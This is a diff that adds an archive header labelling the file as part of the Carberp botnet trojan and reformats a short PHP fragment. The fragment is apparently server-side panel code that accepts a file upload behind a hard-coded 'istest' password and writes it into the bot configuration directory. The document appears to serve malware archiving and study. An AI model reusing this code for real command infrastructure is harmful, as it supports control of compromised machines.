@@ -1,9 +1,23 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 if(!empty($_POST['pass'])){
-	switch($_POST['pass']){		case 'istest':
-			if(move_uploaded_file($_FILES['file']['tmp_name'], 'cfg/istest')){				print('Сохранено!');
-			}else{				print('Ошибка!');
+	switch($_POST['pass']){
+		case 'istest':
+			if(move_uploaded_file($_FILES['file']['tmp_name'], 'cfg/istest')){
+				print('Сохранено!');
+			}else{
+				print('Ошибка!');
 			}
 		break;
 
